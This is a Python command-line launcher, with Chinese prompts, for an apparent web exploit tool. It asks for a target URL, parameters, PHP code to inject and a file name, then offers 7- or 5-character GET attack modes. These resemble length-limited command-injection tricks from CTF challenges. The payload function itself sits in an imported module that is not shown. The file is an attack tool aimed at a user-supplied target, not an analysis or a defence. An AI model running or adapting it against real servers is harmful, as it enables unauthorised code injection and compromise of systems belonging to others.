from colorama import init
from lctools import exploit_payload_get

# 引入常量字符串
from common import (
    GET_METHOD,
    EXAMPLE_URL,
    EXAMPLE_URL_PARAM,
    EXAMPLE_PHP,
    EXAMPLE_FILE_NAME,
)

init(autoreset=True)


def init_program() -> list[str]:
    """
    引入程序, 获取请求地址, 请求方式和
    """
    target_url = input(f"请输入目标url {EXAMPLE_URL}\n> ")
    target_args = input(f"请输入请求参数(可空) {EXAMPLE_URL_PARAM}\n> ")
    target_command = input(f"请输入注入php代码 {EXAMPLE_PHP}\n> ")
    target_php_file_name = input(f"请输入目标php文件名 {EXAMPLE_FILE_NAME}\n> ")
    return [target_url, target_args, target_command, target_php_file_name]


def print_menu() -> int:
    print(f"请选择攻击类型: (默认1)")
    print(f"1. {GET_METHOD} 7字符")
    print(f"2. {GET_METHOD} 5字符")
    try:
        _choice = int(input("> "))
        return _choice
    except:
        print("输入错误, 已默认选择 1.")
        return 1


if __name__ == "__main__":
    # 选择攻击模式
    choice = print_menu()

    # 根据模式执行不同模块
    if choice == 1:
        program_argv = init_program()
        exploit_payload_get(
            program_argv[0], program_argv[1], program_argv[2], program_argv[3], 7
        )
    elif choice == 2:
        program_argv = init_program()
        exploit_payload_get(
            program_argv[0], program_argv[1], program_argv[2], program_argv[3], 5
        )
    else:
        print("没有该选择.")
